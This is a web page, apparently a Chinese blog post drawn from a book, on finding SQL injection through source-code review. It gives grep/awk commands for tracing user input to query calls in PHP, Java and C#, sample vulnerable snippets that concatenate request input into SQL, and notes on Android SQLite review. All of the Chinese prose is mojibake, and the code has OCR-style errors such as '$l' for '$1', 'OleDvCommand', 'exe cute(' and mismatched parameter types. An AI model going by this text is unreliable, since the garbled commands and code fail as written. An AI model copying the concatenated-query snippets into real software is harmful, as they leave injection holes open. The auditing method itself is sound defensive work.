()ä¸€ä»“då»ºä¸€ä¸ªè¯­å¥å¯¹è±¡ä»¥ä¾¿å‘æ•°æ®åº“å‘é€SQLè¯­å¥</span>statement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//prepareStatement () ä¸€åˆ›å»ºä¸€æ¡é¢„ç¼–è¯‘çš„SQLè¯­å¥å¹¶å°†å…¶ä¿å­˜åˆ°å¯¹è±¡ä¸­</span><span class="token class-name">PreparedStatement</span> sql <span class="token operator">=</span> con<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//executeQuery () ä¸€ è¡Œç»™å®šçš„SQLè¯­å¥ï¼Œä»æŒ‡å®šçš„è¡¨ä¸­è·å–æ•°æ®</span>result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//executeUpdate ()â€” è¡Œä¸€æ¡SQLè¯­å¥ï¼Œè¯¥è¯­å¥å¯èƒ½æ˜¯ä¸€æ¡æ¡è¿”å›ä»»ä½•å€¼çš„INSERTã€UPDATEæˆ– //DELETE è¯­å¥</span>result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//execute ()â€” è¡Œç»™å®šçš„SQLè¯­å¥ï¼Œä»æŒ‡å®šçš„è¡¨ä¸­è·å–æ•°æ®</span>result <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//addBatch () ä¸€å°†æŒ‡å®šçš„SQLå‘½ä»¤æ·»åŠ åˆ°å½“å‰å‘½ä»¤åˆ—è¡¨ä¸­</span>statement<span class="token punctuation">.</span><span class="token function">addBatch</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>statement<span class="token punctuation">.</span><span class="token function">addBatch</span><span class="token punctuation">(</span>more_aql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="C"><a href="#C" class="headerlink" title="C#"></a>C#</h5><p>.NETå¼€å‘ä½¿ç”¨ä¸‹åˆ—å‘½åç©ºé—´</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">System.Data.SqlClientï¼š SQL Server çš„.NET Framework Data Provider(.NET æ¡†æ¶æ•°æ®æä¾›ç¨‹åº)System.Data.OleDbï¼š OLE DB çš„.NET Framework Data ProviderSystem.Data.OracleClientï¼š Oracle çš„.NET Framework Data ProvideroSystem.Data.Odbc: ODBC çš„.NET Framework Data Provider<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">//SqlCommand()  ç”¨äºæ„é€ æˆ–å‘é€SQLè¯­å¥æˆ–å­˜å‚¨è¿‡ç¨‹SqlCommand command = new SqlCommand(sql, connection);//SqlParameter()  ç”¨äºå‘ SqlCommand å¯¹è±¡æ·»åŠ å‚æ•°SqlCommand command = new SqlCommand(sql,connection);command.Parameters.Add("@param", SqlDbType.VarChar, 50).Value = input; //OleDbCommand()  ç”¨äºæ„é€ æˆ–å‘é€SQLè¯­å¥æˆ–å­˜å‚¨è¿‡ç¨‹OleDbCommand command = new OleDbCommand(sql,connection);//OleDbParameter()  ç”¨äºå‘ OleDbCommand å¯¹è±¡æ·»åŠ å‚æ•°OleDvCommand command = new OleDbCommand($sql,connection);command.parameters.Add("@paran", OleDbType.VarChar, 50).Value = input; //OracleCommand()  ç”¨äºæ„é€ /å‘é€SQLè¯­å¥æˆ–å­˜å‚¨è¿‡ç¨‹oracleCommand command = new OracleCommand(sql,connection);//OracleParameter()  ç”¨äºå‘ OracleCommand å¯¹è±¡æ·»åŠ å‚æ•°OracleCommand command = new OracleCommand(sql,connection); command.Parameters.Add("@param", OleDbType.VarChar,50).Value = input; //OdbcCommand()  ç”¨äºæ„é€ æˆ–å‘é€SQLè¯­å¥OdbcCommand command = new OdbcCommand(sql,connection);//OdbcParameter()  ç”¨äºå‘ OdbcCommand å¯¹è±¡æ·»åŠ å‚æ•°OdbcCommand command = new OdbcCommand(sql,connection);command.Parameters.Add("@paramn",OleDbType.VarChar,50) .Value = input;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è·Ÿè¸ªæ•°æ®"><a href="#è·Ÿè¸ªæ•°æ®" class="headerlink" title="è·Ÿè¸ªæ•°æ®"></a>è·Ÿè¸ªæ•°æ®</h4><h5 id="è·Ÿè¸ªPHPä¸­çš„æ•°æ®"><a href="#è·Ÿè¸ªPHPä¸­çš„æ•°æ®" class="headerlink" title="è·Ÿè¸ªPHPä¸­çš„æ•°æ®"></a>è·Ÿè¸ªPHPä¸­çš„æ•°æ®</h5><p>é¦–å…ˆæ³¨æ„åˆ°<code>register_globals</code>å’Œ<code>magic_quotes</code>çš„çŠ¶æ€</p><p><code>register_globals</code>è´Ÿè´£å°†EGPCSæ³¨å†Œæˆå…¨å±€å˜é‡ï¼Œ<code>magic_qoutes</code>è¿‡æ»¤å•å¼•å·ã€åŒå¼•å·ã€åæ–œçº¿ã€NULLå­—ç¬¦ã€‚</p><p>æ¥ä¸‹æ¥æ’æŸ¥ä»£ç ï¼Œæœç´¢phpæºæ–‡ä»¶ç›®å½•ï¼Œå¯»æ‰¾<code>mssql_query()ã€mysql_query()ã€mysql_db_query()</code>ä½œç”¨ï¼šç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ’å…¥SQLè¯­å¥ä¸­</p><p>ç”¨ä»¥ä¸‹å‘½ä»¤æ‰“å°åŒ¹é…çš„å†…å®¹æ–‡ä»¶åå’Œè¡Œå·</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span><span class="token string">"\(mysql\|mssql\|mysql_db\)_query\(.*\$\(GET\|\POST\)"</span>.*<span class="token punctuation">\</span><span class="token punctuation">)</span><span class="token string">" src/ | awk -F: '{print "</span>filename: <span class="token string">"<span class="token variable">$l</span>"</span><span class="token punctuation">\</span>nline: <span class="token string">"<span class="token variable">$2</span>"</span><span class="token punctuation">\</span>nmatch: <span class="token string">"<span class="token variable">$3</span>"</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>n<span class="token string">"}'filename: src/mssql_query.vuln.phpline: 11match: <span class="token variable">$result</span> = mssql_query("</span>SELECT * FROM TBL WHERE COLUMN <span class="token operator">=</span><span class="token string">'$_GET['</span>var<span class="token string">']'</span><span class="token string">");filename: src/mysql_query.vuln.phpline: 13match: <span class="token variable">$result</span> = mysql_query("</span>SELECT * FROM TBL WHERE COLUMN <span class="token operator">=</span> <span class="token string">'$_GET['</span>var<span class="token string">']'</span>",<span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯»æ‰¾<code>oci_parseã€ora_parse</code>ä½œç”¨ï¼šç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ’å…¥SQLæ–‡ä»¶ä¸­ï¼Œä¼˜å…ˆçº§å¤§äº<code>oci_execã€ora_execã€oci_execute</code></p><p>å‘½ä»¤ä¸å‰é¢ç›¸è¯†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span>  <span class="token string">"\(oci\|ora\)_parse\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span><span class="token function">awk</span> -F: <span class="token number">1</span><span class="token punctuation">{</span>print <span class="token string">"filename: "</span><span class="token variable">$l</span><span class="token string">"<span class="token entity" title="\n">\n</span>line: "</span><span class="token variable">$2</span><span class="token string">"<span class="token entity" title="\n">\n</span>match: "</span><span class="token variable">$3</span><span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">}</span><span class="token string">' filename: src/oci_parse.vuln.phpline: 4match: $stid = oci_parse($conn, "SELECT * FROM TABLE WHERE COLUMN = '</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var1]'</span><span class="token string">");filename: src/ora_parse.vuln.phpline: 13match: ora_parse(<span class="token variable">$curs</span>,"</span>SELECT * FROM TABLE WHERE COLUMN <span class="token operator">=</span><span class="token string">'$_GET['</span>var<span class="token string">']'</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯»æ‰¾<code>odbc_prepare()ã€odbc_exec()</code>ä½œç”¨ï¼šç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ’å…¥SQLæ–‡ä»¶ä¸­ï¼Œ<code>odbc_prepare()</code>å…ˆäº<code>odbc_execute()</code>è¢«ç¼–è¯‘æˆSQLè¯­å¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\(odbc_prepare\|odbc_exec\)\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯»æ‰¾<code>mssql_bind()</code>ä½œç”¨ï¼šç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ’å…¥åˆ°SQLæ–‡ä»¶ä¸­ï¼Œä¼˜å…ˆçº§å¤§äº<code>mssql_execute()</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"mssql_bind\(.*\<span class="token variable">$_</span>\(GET\|\POST\).*\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#å½¢å¦‚</span>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM TBL WHERE COLUMN = '$_GET['var']'"</span><span class="token punctuation">;</span>$result <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span>$<span class="token keyword">sql</span><span class="token punctuation">,</span> $link<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢çš„å‘½ä»¤ä¸èƒ½åŒ¹é…ï¼Œå°†ä¸Šé¢çš„å‘½ä»¤åˆå¹¶ä¼˜åŒ–å¾—åˆ°</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"mssql_query(\|mysql_query(\|mysql_db_query(\|oci_parse (\|ora_parse(\|mssql_bind(\|mssql_execute(\|odbc_prepare(\|odbc_execute (\|odbc_execute(\|odbc_exec("</span>src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print"filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç†æƒ³è·å¾—</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">20</span>match: <span class="token variable">$result</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>mysql_query()å‘æ•°æ®åº“å‘é€ä¸€æ¡æŸ¥è¯¢ï¼Œä½†ä¸çŸ¥é“$sqlçš„å€¼ï¼Œæ— æ³•åˆ¤æ–­æ˜¯å¦è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥è·Ÿè¸ª$sqlå˜é‡</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$sql</span>"</span> src/ ä¸¨ <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span class="token comment">#å˜é‡å¯èƒ½é‡ç”¨ï¼Œä¸é‡‡ç”¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$sql</span> =.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span class="token comment">#ä½¿ç”¨sqlè¯­å¥æŸ¥æ‰¾ï¼Œç¼©å°æ’æŸ¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç†æƒ³è·å¾—</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">20</span>match: <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '<span class="token variable">$_GET</span>['input']'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ˜¯å¯ä»¥åˆ¤æ–­å­˜åœ¨SQLæ³¨å…¥</p><p>å¦ä¸€ç§æƒ…å†µ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">20</span>match: <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '$ input'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åˆä¸èƒ½åˆ¤æ–­$input æ˜¯å¦è¢«æ±¡æŸ“ï¼Œè·Ÿè¸ª$input</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$input</span>=.*\$.*"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç†æƒ³ç»“æœ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">10</span>match: <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯è¿˜æ˜¯ä¸èƒ½æ–­å®šå­˜åœ¨SQLæ³¨å…¥ï¼Œå› ä¸ºå¯ä»¥å­˜åœ¨å¯¹$inputçš„è¿‡æ»¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"\<span class="token variable">$input</span>"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">11</span>match: <span class="token keyword">if</span> <span class="token punctuation">(</span>is_string<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">))</span><span class="token punctuation">{</span>filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">12</span>match: <span class="token keyword">if</span> <span class="token punctuation">(</span>strlen<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$maxlength</span><span class="token punctuation">)</span><span class="token punctuation">{</span>filename: src/SQLi.MySQL.vulnerable.phpline: <span class="token number">13</span>match: <span class="token keyword">if</span> <span class="token punctuation">(</span>ctype_alnum<span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">))</span><span class="token punctuation">{</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»è¿‡å¯¹è¿‡æ»¤å‡½æ•°çš„åˆ†æï¼Œå°±èƒ½åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥</p><h5 id="è·Ÿè¸ªJavaä¸­çš„æ•°æ®"><a href="#è·Ÿè¸ªJavaä¸­çš„æ•°æ®" class="headerlink" title="è·Ÿè¸ªJavaä¸­çš„æ•°æ®"></a>è·Ÿè¸ªJavaä¸­çš„æ•°æ®</h5><p>åœ¨Javaæºæ–‡ä»¶çš„ç›®å½•ä¸­ï¼Œå¯»æ‰¾æ˜¯å¦å­˜åœ¨ä½¿ç”¨äº† prepareStatement()ã€ executeQuery()ã€executeUpdate()ã€addBatch()å’Œ executeBatch()çš„æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"preparedStatement(\|executeQuery(\|executeUpdate(\|exe cute(\|addBatch(\|executeBatch("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print "filename:"$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è·å¾—</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">filename: src/SQLVuln.javaline: <span class="token number">89</span>match: ResultSet rs <span class="token operator">=</span> statement.executeQuery<span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>filename: src/SQLVuln.javaline: <span class="token number">139</span>match: statement.executeUpdate<span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>filename: src/SQLVuln.javaline: <span class="token number">209</span>match: ResultSet rs <span class="token operator">=</span> statement.executeQuery<span class="token punctuation">(</span><span class="token string">"SELECT field FROM table WHERE field = "</span> +request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>209è¡Œ<code>input</code>æ˜¯ç”¨æˆ·ç›´æ¥é€šè¿‡è¡¨å•æäº¤è¾“å…¥ï¼Œå­˜åœ¨SQLæ³¨å…¥</p><p>è¿˜éœ€å¯¹89,139è¡Œçš„sqlè¿›è¡Œè·Ÿè¸ªåˆ¤æ–­æ˜¯å¦è¢«æ±¡æŸ“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> - i <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"sql =.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>filename: src/SQLVuln.javaline: <span class="token number">88</span>match: String sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"SELECT field FROM table WHERE field = "</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">))</span><span class="token punctuation">;</span>filename: src/SQLVuln.javaline: <span class="token number">138</span>match: String sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"INSERT INTO table VALUES field = ("</span> +request.getParameter <span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">") WHERE field = "</span> + request. getParameter <span class="token punctuation">(</span><span class="token string">"more-input"</span><span class="token punctuation">)</span> + "<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œå‰é¢ä¸€æ ·ï¼Œä¹Ÿå­˜åœ¨SQLæ³¨å…¥</p><p>æ‰¾åˆ°æ¸—å…¥æº</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"getParameter(\|getParameterValues(\|getQueryString (\|getHeader(\|getHeaders(\|getRequestedSessionld(\|getCookies(\|getValue("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="è·Ÿè¸ªC-ä¸­çš„æ•°æ®"><a href="#è·Ÿè¸ªC-ä¸­çš„æ•°æ®" class="headerlink" title="è·Ÿè¸ªC#ä¸­çš„æ•°æ®"></a>è·Ÿè¸ªC#ä¸­çš„æ•°æ®</h5><p>åœ¨ä¸€ä¸ªC#æºæ–‡ä»¶çš„ç›®å½•ä¸­ï¼Œå¯»æ‰¾ä½¿ç”¨äº† SqlCommand()ã€SqlParameter()ã€OleDbCommand()ã€OleDbParameter()ã€OracleCommand()ã€OracleParameter() ã€OdbcCommand()å’Œ OdbcParameter()çš„ä½ç½®</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"SqlCommand(\|SqlParameter(\|OleDbCommand(\|OleDbParam eter(\|OracleCommand(\|OracleParameter(\|OdbcCommand(\|OdbcParameter("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>filename: src/SQLiMSSQLVuln.csline: <span class="token number">29</span>match: SqlCommand <span class="token builtin class-name">command</span> <span class="token operator">=</span> new SqlCommand<span class="token punctuation">(</span><span class="token string">"SELECT â˜… FROM table WHERE field = '"</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">"'"</span>,conn<span class="token punctuation">)</span><span class="token punctuation">;</span>filename: src/SQLiOracleVuln.csline: <span class="token number">69</span>match: OracleCommand <span class="token builtin class-name">command</span> <span class="token operator">=</span> new OracleCommand<span class="token punctuation">(</span>sql, conn<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>29è¡Œ<code>input</code>æ˜¯ç”¨æˆ·ç›´æ¥é€šè¿‡è¡¨å•æäº¤è¾“å…¥ï¼Œå­˜åœ¨SQLæ³¨å…¥</p><p>è¿˜éœ€å¯¹69è¡Œçš„sqlè¿›è¡Œè·Ÿè¸ªåˆ¤æ–­æ˜¯å¦è¢«æ±¡æŸ“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"sql =.*<span class="token entity" title="\&quot;">\"</span> \(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ I <span class="token function">awk</span> -F:<span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>filename: src/SQLiOracleVuln.csline: <span class="token number">68</span>match: String sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '"</span> + request.getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> + <span class="token string">"'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œå‰é¢ä¸€æ ·ï¼Œä¹Ÿå­˜åœ¨SQLæ³¨å…¥</p><p>æ‰¾åˆ°æ¸—å…¥æº</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"HttpCookieCollection\|Form\|Headers\|Params\|QuerySt ring\|Servervariables\|Url\|UserAgent\|UserHostAddress\|UserHostName"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="å¤æŸ¥Androidåº”ç”¨ç¨‹åºä»£ç "><a href="#å¤æŸ¥Androidåº”ç”¨ç¨‹åºä»£ç " class="headerlink" title="å¤æŸ¥Androidåº”ç”¨ç¨‹åºä»£ç "></a>å¤æŸ¥Androidåº”ç”¨ç¨‹åºä»£ç </h4><h5 id="å·¥å…·-1"><a href="#å·¥å…·-1" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h5><p><a href="http://labs.mwrinfosecurity.com/tools/android_webcontentresolver/">WebContentResolver</a>ï¼Œå®ƒå¯ä»¥è¿è¡Œåœ¨Androidè®¾å¤‡(æˆ–æ¨¡æ‹Ÿå™¨)ä¸Šï¼Œå¹¶å‘ æ‰€æœ‰å·²å®‰è£…çš„å†…å®¹æä¾›ç¨‹åºæš´éœ²Web Serviceæ¥å£ã€‚</p><p>dex2jarè¿™æ ·çš„å·¥å…·å¯ä»¥è½»è€Œæ˜“ä¸¾åœ°å°†Androidåº”ç”¨ç¨‹åºçš„åŒ…æ–‡ä»¶(APK) è½¬æ¢ä¸ºJava Archive (JAR)æ–‡ä»¶ã€‚ç„¶åï¼Œå¯ä»¥é‡‡ç”¨æŸç§Javaåæ±‡ç¼–ç¨‹åº æ¯”å¦‚jdguiæˆ– jad,åç¼–è¯‘åº”ç”¨ç¨‹åºå¹¶æŸ¥çœ‹æºä»£ç ã€‚</p><h5 id="å±é™©å‡½æ•°"><a href="#å±é™©å‡½æ•°" class="headerlink" title="å±é™©å‡½æ•°"></a>å±é™©å‡½æ•°</h5><p>Androidå¼€å‘äººå‘˜ä½¿ç”¨ä¸¤ä¸ªç±»ä¸SQLiteæ•°æ®åº“è¿›è¡Œäº¤äº’ï¼š<code>SQLiteQueryBuilder</code>ç±»å’Œ <code>SQLiteDatabase</code>ç±»ã€‚<code>android.database.sqlite.SQLiteQueryBuilder</code> æ˜¯ä¸€ä¸ªä¾¿æ·ç±»ï¼Œç”¨äºåˆ›å»ºå‘é€ç»™SQLiteDatabaseå¯¹è±¡çš„SQLæŸ¥è¯¢<code>android.database.sqlite.SQLiteDatabase</code> ç±» åˆ™æä¾›äº†ç”¨äºç®¡ç† SQLite æ•°æ®åº“çš„å„ç§æ–¹æ³•ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//android.database.sqlite.SQLiteQueryBuilder</span><span class="token comment">//æ„é€ ä¸€æ¡SELECTè¯­å¥ï¼Œè¯¥è¯­å¥é€‚åˆä½œä¸ºbuildUnionQueryä¸­é€šè¿‡UNIONæ“ä½œç¬¦è¿æ¥çš„è¯­å¥ç»„ä¸­çš„SELECTè¯­å¥</span><span class="token function">buildQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projectionIn<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span><span class="token comment">//ç”¨æŒ‡å®šçš„å­å¥æ„é€ ä¸€ä¸ªSQLæŸ¥è¯¢å­—ç¬¦ä¸²</span><span class="token function">buildQueryString</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> distinct<span class="token punctuation">,</span> <span class="token class-name">String</span> tables<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name"><span class="token namespace">columns<span class="token punctuation">.</span></span> String</span> <span class="token class-name"><span class="token namespace">where<span class="token punctuation">.</span></span> String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> orderBy<span class="token 